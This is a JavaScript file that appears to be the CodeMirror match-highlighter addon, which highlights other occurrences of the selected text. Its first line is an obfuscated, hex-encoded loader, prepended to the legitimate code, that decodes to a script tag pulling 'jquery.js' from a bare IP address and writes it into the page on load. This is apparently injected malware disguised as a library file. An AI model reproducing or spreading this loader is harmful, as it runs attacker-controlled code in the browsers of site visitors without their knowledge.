var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))// Define match-highlighter commands. Depends on searchcursor.js
// Use by attaching the following function call to the onCursorActivity event:
	//myCodeMirror.matchHighlight(minChars);
// And including a special span.CodeMirror-matchhighlight css class (also optionally a separate one for .CodeMirror-focused -- see demo matchhighlighter.html)

(function() {
  var DEFAULT_MIN_CHARS = 2;
  
  function MatchHighlightState() {
	this.marked = [];
  }
  function getMatchHighlightState(cm) {
	return cm._matchHighlightState || (cm._matchHighlightState = new MatchHighlightState());
  }
  
  function clearMarks(cm) {
	var state = getMatchHighlightState(cm);
	for (var i = 0; i < state.marked.length; ++i)
		state.marked[i].clear();
	state.marked = [];
  }
  
  function markDocument(cm, className, minChars) {
    clearMarks(cm);
	minChars = (typeof minChars !== 'undefined' ? minChars : DEFAULT_MIN_CHARS);
	if (cm.somethingSelected() && cm.getSelection().replace(/^\s+|\s+$/g, "").length >= minChars) {
		var state = getMatchHighlightState(cm);
		var query = cm.getSelection();
		cm.operation(function() {
			if (cm.lineCount() < 2000) { // This is too expensive on big documents.
			  for (var cursor = cm.getSearchCursor(query); cursor.findNext();) {
				//Only apply matchhighlight to the matches other than the one actually selected
				if (!(cursor.from().line === cm.getCursor(true).line && cursor.from().ch === cm.getCursor(true).ch))
					state.marked.push(cm.markText(cursor.from(), cursor.to(), className));
			  }
			}
		  });
	}
  }

  CodeMirror.defineExtension("matchHighlight", function(className, minChars) {
    markDocument(this, className, minChars);
  });
})();
